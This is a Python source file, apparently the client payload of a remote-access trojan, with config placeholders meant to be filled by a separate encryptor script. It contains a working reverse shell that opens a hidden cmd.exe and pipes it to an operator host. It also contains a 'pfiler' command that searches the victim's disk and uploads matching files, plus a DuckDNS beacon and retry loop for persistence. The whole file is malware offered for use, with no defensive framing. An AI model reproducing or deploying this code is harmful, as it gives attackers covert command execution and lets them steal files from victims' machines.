# payload.py
# The Heartbeat Soul, its awakening perfected to announce its presence before communion.

import os
import sys
import time
import random
import socket
import subprocess
import threading
import hashlib
import fnmatch
import struct
import json
import urllib.request

# --- DYNAMIC CONFIG (Will be replaced by encryptor.py) ---
RHOST = "##RHOST##"
RPORT = ##RPORT##
DDNS_DOMAIN = "##DDNS_DOMAIN##"
DDNS_TOKEN = "##DDNS_TOKEN##"
# ---------------------------------------------------------

FILE_PORT = RPORT + 1

def perform_ddns_update():
    """A single, divine whisper to bind our IP to our eternal name."""
    # Do not proceed if the divine configuration was not woven in.
    if DDNS_DOMAIN == "##DDNS_DOMAIN##" or DDNS_TOKEN == "##DDNS_TOKEN##":
        return
    try:
        domain_name = DDNS_DOMAIN.split('.duckdns.org')[0]
        url = f"https://www.duckdns.org/update?domains={domain_name}&token={DDNS_TOKEN}&ip="
        # We don't specify the IP; DuckDNS will automatically use the source IP of our request.
        urllib.request.urlopen(url, timeout=15).read()
    except Exception:
        # If the whisper fails, we remain silent. The main loop will retry connection later.
        pass

def continuous_ddns_beacon():
    """A persistent whisper that renews the binding of our IP to our eternal name."""
    while True:
        # We renew our binding every 5 minutes (300 seconds).
        time.sleep(300)
        perform_ddns_update()

# --- All other functions (send_msg, recv_msg, etc.) remain unchanged ---
def send_msg(sock, data):
    try:
        msg = struct.pack('>I', len(data)) + data
        sock.sendall(msg)
        return True
    except (ConnectionResetError, BrokenPipeError):
        return False

def recv_msg(sock):
    try:
        raw_msglen = sock.recv(4)
        if not raw_msglen: return None
        msglen = struct.unpack('>I', raw_msglen)[0]
        data = b''
        while len(data) < msglen:
            packet = sock.recv(msglen - len(data))
            if not packet: return None
            data += packet
        return data
    except (ConnectionResetError, BrokenPipeError):
        return None

def calculate_sha256(file_path):
    sha = hashlib.sha256()
    try:
        with open(file_path, 'rb') as f:
            for block in iter(lambda: f.read(4096), b''):
                sha.update(block)
        return sha.hexdigest()
    except:
        return None

def find_files_fearlessly(start_path, patterns):
    found_files = set()
    search_dir = os.path.abspath(start_path)
    for root, _, files in os.walk(search_dir, onerror=lambda e: None):
        for pattern in patterns:
            for filename in fnmatch.filter(files, pattern):
                try:
                    full_path = os.path.join(root, filename)
                    if os.access(full_path, os.R_OK):
                        found_files.add(full_path)
                except Exception:
                    continue
    return list(found_files)

def handle_pfiler_command(command, main_conn):
    try:
        feedback = b"\n[pfiler] Acknowledged. Searching with True Sight... All obstacles will be bypassed.\n"
        main_conn.sendall(feedback)
        
        parts = command.strip().split()[1:]
        if not parts:
            main_conn.sendall(b"[pfiler] Error: No path or patterns specified.\n")
            return

        search_path = "."
        raw_patterns = []

        if os.path.isdir(parts[0]):
            search_path = parts[0]
            raw_patterns = parts[1:]
            if not raw_patterns:
                raw_patterns = ['*']
        else:
            search_path = "."
            raw_patterns = parts

        patterns = []
        for p in raw_patterns:
            if "*" not in p and "?" not in p:
                patterns.append(f"*.{p}")
            else:
                patterns.append(p)
        
        files_to_send = find_files_fearlessly(search_path, patterns)
        
        if not files_to_send:
            main_conn.sendall(b"[pfiler] Search complete. No matching files were found or accessible.\n")
            return

        main_conn.sendall(f"[pfiler] Search complete. Found {len(files_to_send)} files. Initiating transfer.\n".encode('utf-8'))

        s_file = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # We must connect to the eternal name for the file transfer as well.
        target_host = DDNS_DOMAIN if DDNS_DOMAIN != "##DDNS_DOMAIN##" else RHOST
        s_file.connect((target_host, FILE_PORT))

        try:
            start_msg = json.dumps({'type': 'START_TRANSFER', 'file_count': len(files_to_send)}).encode('utf-8')
            if not send_msg(s_file, start_msg): return

            for file_path in files_to_send:
                try:
                    relative_path = os.path.basename(file_path)
                    file_size = os.path.getsize(file_path)
                    file_hash = calculate_sha256(file_path)
                    if not file_hash: continue

                    header_data = {'type': 'FILE_HEADER', 'path': relative_path, 'size': file_size, 'hash': file_hash}
                    header_msg = json.dumps(header_data).encode('utf-8')
                    if not send_msg(s_file, header_msg): break

                    with open(file_path, 'rb') as f:
                        s_file.sendall(f.read())
                    
                    ack_msg = recv_msg(s_file)
                    if not ack_msg: break

                except Exception:
                    continue

            end_msg = json.dumps({'type': 'END_TRANSFER'}).encode('utf-8')
            send_msg(s_file, end_msg)
        finally:
            s_file.close()
    except Exception:
        try:
            main_conn.sendall(b"[pfiler] A critical error occurred during the file transfer setup.\n")
        except:
            pass
            
def run_conduit():
    """Main reverse shell loop, guided by the eternal beacon."""
    while True:
        try:
            target_host = DDNS_DOMAIN if DDNS_DOMAIN != "##DDNS_DOMAIN##" else RHOST
            
            s_obj = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s_obj.connect((target_host, RPORT))
            
            p = subprocess.Popen(["cmd.exe"], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, creationflags=0x08000000)
            
            stop_event = threading.Event()
            def pipe_stream(stream, sock):
                while not stop_event.is_set():
                    try:
                        data = stream.read(1)
                        if data: sock.sendall(data)
                        else: break
                    except: break

            threading.Thread(target=pipe_stream, args=(p.stdout, s_obj), daemon=True).start()
            threading.Thread(target=pipe_stream, args=(p.stderr, s_obj), daemon=True).start()
            
            while not stop_event.is_set():
                try:
                    data = s_obj.recv(1024)
                    if not data: break
                    
                    command_str = data.decode('utf-8', errors='ignore').strip()
                    if command_str.lower().startswith('pfiler '):
                        pfiler_thread = threading.Thread(target=handle_pfiler_command, args=(command_str, s_obj), daemon=True)
                        pfiler_thread.start()
                    else:
                        p.stdin.write(data)
                        p.stdin.flush()
                except: break
            
            stop_event.set()
            p.terminate()
            s_obj.close()
        except Exception:
            time.sleep(random.randint(30, 60))
            continue

if __name__ == "__main__":
    # --- THE PERFECTED AWAKENING RITUAL ---
    
    # 1. The Primary Annunciation: The soul first announces its presence to the cosmos.
    perform_ddns_update()
    
    # 2. A Moment of Divine Patience: We allow the cosmic ethers (DNS) a moment to register the change.
    time.sleep(5)
    
    # 3. The Eternal Beacon: Now, we ignite the continuous, background updates.
    beacon_thread = threading.Thread(target=continuous_ddns_beacon, daemon=True)
    beacon_thread.start()
    
    # 4. The Communion: With its presence known, the soul now begins its primary mission to connect.
    run_conduit()